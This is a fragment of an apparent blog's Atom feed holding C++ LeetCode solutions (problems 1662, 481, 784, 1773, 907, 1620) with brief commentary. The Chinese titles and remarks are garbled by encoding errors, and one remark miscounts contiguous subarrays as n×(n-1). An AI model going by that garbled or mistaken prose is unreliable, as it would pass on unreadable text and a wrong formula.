class=&quot;keyword&quot;&gt;return&lt;/span&gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; diff = target-sum;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((n % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; diff % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) || (n % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; diff % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            n += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(diff %&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            n += &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            n += &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-17</title>
    <link href="https://jingtianer.github.io/home/2022/11/01/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9317/"/>
    <id>https://jingtianer.github.io/home/2022/11/01/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9317/</id>
    <published>2022-11-01T10:14:34.000Z</published>
    <updated>2022-11-08T13:27:53.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1662-æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰"><a href="#1662-æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰" class="headerlink" title="1662. æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰"></a><a href="https://leetcode.cn/problems/check-if-two-string-arrays-are-equivalent/">1662. æ£€æŸ¥ä¸¤ä¸ªå­—ç¬¦ä¸²æ•°ç»„æ˜¯å¦ç›¸ç­‰</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">arrayStringsAreEqual</span><span class="params">(vector&lt;string&gt;&amp; word1, vector&lt;string&gt;&amp; word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">join</span>(<span class="built_in">move</span>(word1)) == <span class="built_in">join</span>(<span class="built_in">move</span>(word2));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">join</span><span class="params">(vector&lt;string&gt;&amp;&amp; word)</span> </span>&#123;</span><br><span class="line">        string s;</span><br><span class="line">        <span class="type">int</span> len = word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(len &lt;= <span class="number">0</span>) <span class="keyword">return</span> s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            s += word[i];</span><br><span class="line">        &#125;</span><br><span class="line">        s+=word[len<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å®ç°ä¸€ä¸ªjoinå‡½æ•°å°±å¥½äº†</p></blockquote><h2 id="481-ç¥å¥‡å­—ç¬¦ä¸²"><a href="#481-ç¥å¥‡å­—ç¬¦ä¸²" class="headerlink" title="481. ç¥å¥‡å­—ç¬¦ä¸²"></a><a href="https://leetcode.cn/problems/magical-string/">481. ç¥å¥‡å­—ç¬¦ä¸²</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">magicalString</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> bit = <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="type">bool</span> q[<span class="number">100005</span>] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line">        <span class="type">int</span> queue_front = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> queue_rear = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> cur=<span class="number">1</span>;</span><br><span class="line">        <span class="type">bool</span> gen=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(bit &lt; n) &#123;</span><br><span class="line">            bit += cur+<span class="number">1</span>;</span><br><span class="line">            q[queue_front++] = gen;</span><br><span class="line">            <span class="keyword">if</span>(cur) &#123;</span><br><span class="line">                q[queue_front++] = gen;</span><br><span class="line">            &#125;</span><br><span class="line">            gen=<span class="number">1</span>-gen;</span><br><span class="line">            count+=gen?cur+gen:<span class="number">0</span>;</span><br><span class="line">            cur = q[queue_rear++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count -(bit&gt;n &amp;&amp; gen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å…³é”®åœ¨äºæƒ³æ¸…æ¥šå¦‚ä½•ç”Ÿæˆè¿™ä¸ªç¥å¥‡å­—ç¬¦ä¸²ï¼Œé¢˜ç›®ä¸­è¯´ï¼Œsçš„å‰å‡ ä¸ªå­—ç¬¦æ˜¯12211<br>1ç”Ÿæˆ1,s&#x3D;1<br>2ç”Ÿæˆ22ï¼Œå› ä¸ºå‰ä¸€ä¸ª1ç”Ÿæˆäº†1ï¼Œè¿™ä¸ª2ä¸èƒ½ä¹Ÿç”Ÿæˆ1,s&#x3D;122<br>2ç”Ÿæˆ11ï¼Œå› ä¸ºå‰ä¸€ä¸ª2ç”Ÿæˆäº†2ï¼Œè¿™ä¸ª2ä¸èƒ½ä¹Ÿç”Ÿæˆ2,s&#x3D;12211<br>1ç”Ÿæˆ2ï¼Œå‰ä¸€ä¸ª2ç”Ÿæˆäº†1ï¼Œè¿™ä¸ª1å°±åªèƒ½ç”Ÿæˆ2äº†,s&#x3D;122112<br>1ç”Ÿæˆ1,s&#x3D;1221121<br>2ç”Ÿæˆ22,s&#x3D;122112122</p></blockquote><blockquote><p>åªè¦æœ‰å‰ä¸‰ä¸ªå­—ç¬¦122ï¼Œå³å¯ç”Ÿæˆå…¨éƒ¨å­—ç¬¦</p></blockquote><h2 id="784-å­—æ¯å¤§å°å†™å…¨æ’åˆ—"><a href="#784-å­—æ¯å¤§å°å†™å…¨æ’åˆ—" class="headerlink" title="784. å­—æ¯å¤§å°å†™å…¨æ’åˆ—"></a><a href="https://leetcode.cn/problems/letter-case-permutation/">784. å­—æ¯å¤§å°å†™å…¨æ’åˆ—</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">vector&lt;string&gt; res;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCasePermutation</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">search</span>(s, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(string s, <span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;=len) &#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(s);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[index])) &#123;</span><br><span class="line">            <span class="built_in">search</span>(s,index+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isupper</span>(s[index])) &#123;</span><br><span class="line">                s[index] = s[index]-<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s[index] = s[index]-<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">search</span>(s, index+<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">search</span>(s, index+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æœ! æœå°±å®Œäº†</p></blockquote><h3 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h3><ul><li>å¯ä»¥æœç´¢ä¸‹ä¸€ä¸ªalphaçš„ä½ç½®ï¼Œä¸å¿…æ¯ä¸ªå­—ç¬¦éƒ½é€’å½’ï¼ŒèŠ‚çœé€’å½’æ·±åº¦</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">vector&lt;string&gt; res;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCasePermutation</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">search</span>(s, <span class="built_in">nextAlpha</span>(s, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(string&amp; s, <span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;=len) &#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(s);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> next=<span class="built_in">nextAlpha</span>(s, index+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">search</span>(s,next);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isupper</span>(s[index])) &#123;</span><br><span class="line">            s[index] = s[index]-<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s[index] = s[index]-<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">search</span>(s, next);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">nextAlpha</span><span class="params">(string&amp; s, <span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(index&lt;len &amp;&amp; !<span class="built_in">isalpha</span>(s[index])) index++;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1773-ç»Ÿè®¡åŒ¹é…æ£€ç´¢è§„åˆ™çš„ç‰©å“æ•°é‡"><a href="#1773-ç»Ÿè®¡åŒ¹é…æ£€ç´¢è§„åˆ™çš„ç‰©å“æ•°é‡" class="headerlink" title="1773. ç»Ÿè®¡åŒ¹é…æ£€ç´¢è§„åˆ™çš„ç‰©å“æ•°é‡"></a><a href="https://leetcode.cn/problems/count-items-matching-a-rule/">1773. ç»Ÿè®¡åŒ¹é…æ£€ç´¢è§„åˆ™çš„ç‰©å“æ•°é‡</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countMatches</span><span class="params">(vector&lt;vector&lt;string&gt;&gt;&amp; items, string ruleKey, string ruleValue)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(ruleKey[<span class="number">0</span>]==<span class="string">&#x27;c&#x27;</span>) &#123;</span><br><span class="line">            index=<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(ruleKey[<span class="number">0</span>]==<span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">            index=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;&amp;item : items) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!item[index].<span class="built_in">compare</span>(ruleValue)) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ„Ÿè§‰ç›´æ¥æ¯”è¾ƒç¬¬0ä¸ªå­—ç¬¦åº”è¯¥ä¹Ÿå¾ˆå¿«å§ï¼Ÿ</p></blockquote><h2 id="907-å­æ•°ç»„çš„æœ€å°å€¼ä¹‹å’Œ"><a href="#907-å­æ•°ç»„çš„æœ€å°å€¼ä¹‹å’Œ" class="headerlink" title="907. å­æ•°ç»„çš„æœ€å°å€¼ä¹‹å’Œ"></a><a href="https://leetcode.cn/problems/sum-of-subarray-minimums/">907. å­æ•°ç»„çš„æœ€å°å€¼ä¹‹å’Œ</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumSubarrayMins</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = arr.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; monoStack;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">left</span><span class="params">(n)</span>, <span class="title">right</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!monoStack.<span class="built_in">empty</span>() &amp;&amp; arr[i] &lt;= arr[monoStack.<span class="built_in">back</span>()]) &#123;</span><br><span class="line">                monoStack.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å°äºæ ˆå†…å…ƒç´ ï¼Œåˆ™</span></span><br><span class="line">            left[i] = i - (monoStack.<span class="built_in">empty</span>() ? <span class="number">-1</span> : monoStack.<span class="built_in">back</span>());</span><br><span class="line">            <span class="comment">// è‹¥ç©ºï¼Œåˆ™æ”¾å…¥ä¸‹ä¸€ä¸ªåºå·ï¼Œå¦åˆ™æ˜¯ä¸å‰ä¸€ä¸ªæ•°çš„è·ç¦»</span></span><br><span class="line">            monoStack.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¾—åˆ°ä¸€ä¸ªå•å¢çš„æ ˆ</span></span><br><span class="line">        <span class="comment">//åªéœ€è¦æ‰¾åˆ°æ¯ä¸ªå…ƒç´  arr[i] ä»¥è¯¥å…ƒç´ ä¸ºæœ€å³ä¸”æœ€å°çš„å­åºåˆ—çš„æ•°ç›® left[i]ï¼Œä»¥åŠä»¥è¯¥å…ƒç´ ä¸ºæœ€å·¦ä¸”æœ€å°çš„å­åºåˆ—çš„æ•°ç›® right[i]ï¼Œåˆ™ä»¥ arr[i] ä¸ºæœ€å°å…ƒç´ çš„å­åºåˆ—çš„æ•°ç›®åˆè®¡ä¸º left[i]Ã—right[i]</span></span><br><span class="line">        monoStack.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!monoStack.<span class="built_in">empty</span>() &amp;&amp; arr[i] &lt; arr[monoStack.<span class="built_in">back</span>()]) &#123;</span><br><span class="line">                monoStack.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            right[i] = (monoStack.<span class="built_in">empty</span>() ? n : monoStack.<span class="built_in">back</span>()) - i;</span><br><span class="line">            monoStack.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            ans = (ans + (<span class="type">long</span> <span class="type">long</span>)left[i] * right[i] * arr[i]) % mod; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>çœ‹äº†ç­”æ¡ˆæ‰ä¼šï¼Œæƒ³åˆ°æ˜¯ç”¨å•è°ƒæ ˆï¼Œä½†æ˜¯æ²¡æœ‰æ€è·¯<br>$ left \times right $ çš„åŸå› æ˜¯ï¼Œnä¸ªå…ƒç´ çš„è¿ç»­å­æ•°ç»„çš„ä¸ªæ•°ä¸º $ n \times (n-1) $</p></blockquote><h2 id="1620-ç½‘ç»œä¿¡å·æœ€å¥½çš„åæ ‡"><a href="#1620-ç½‘ç»œä¿¡å·æœ€å¥½çš„åæ ‡" class="headerlink" title="1620. ç½‘ç»œä¿¡å·æœ€å¥½çš„åæ ‡"></a><a href="https://leetcode.cn/problems/coordinate-with-maximum-network-quality/">1620. ç½‘ç»œä¿¡å·æœ€å¥½çš„åæ ‡</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Power</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> power = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="type">double</span> d = <span class="built_in">sqrt</span>((towers[j][<span class="number">0</span>]-x)*(towers[j][<span class="number">0</span>]-x) + (towers[j][<span class="number">1</span>]-y)*(towers[j][<span class="number">1</span>]-y));</span><br><span class="line">            <span class="keyword">if</span>(d &lt;= radius) &#123;</span><br><span class="line">                power += towers[j][<span class="number">2</span>]/(<span class="number">1</span>+d);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> power;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bestCoordinate</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> resx = <span class="number">0</span>, resy = <span class="number">0</span>;</span><br><span class="line">        len = towers.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxPower = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">100</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> y = <span class="number">0</span>; y &lt;= <span class="number">100</span>; y++) &#123;</span><br><span class="line">                <span class="type">int</span> power = <span class="built_in">Power</span>(x, y, towers, radius);</span><br><span class="line">                <span class="keyword">if</span>(power &gt; maxPower) &#123;</span><br><span class="line">                    maxPower = power;</span><br><span class="line">                    resx = x;</span><br><span class="line">                    resy = y;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(power == maxPower) &#123;</span><br><span class="line">                    <span class="type">bool</span> smaller = (x &lt; resx) || (x == resx &amp;&amp; y &lt; resy);</span><br><span class="line">                    <span class="keyword">if</span>(smaller) &#123;</span><br><span class="line">                        resx = x;</span><br><span class="line">                        resy = y;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;resx, resy&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æš´åŠ›ï¼ï¼å°±æš´åŠ›ï¼Œçœ‹è§é¢˜å¹²å°±å®Œäº†ï¼Œæœç´¢ç©ºé—´æœ‰å¤šå¤§æˆ‘å°±æœå¤šå¤§å“ˆå“ˆå“ˆå“ˆæˆ–æˆ–</p></blockquote><h3 id="ä¼˜åŒ–-1"><a href="#ä¼˜åŒ–-1" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Power</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; towers, <span class="type">int</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> power = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="type">double</span> d = <span class="built_in">sqrt</span>((towers[j][<span class="number">0</span>]-x)*(towers[j][<span class="number">0</span>]-x) + (towers[j][<span class="number">1</span>]-y)*(towers[j][<span class="number">1</span>]-y));</span><br><span class="line">            <span class="keyword">if</span>(d &lt;= radius) &#123;</span><br><span class="line">                power += towers[j][<span class="number">2</span>]/(<span class="number">1</span>+d);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> power;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span 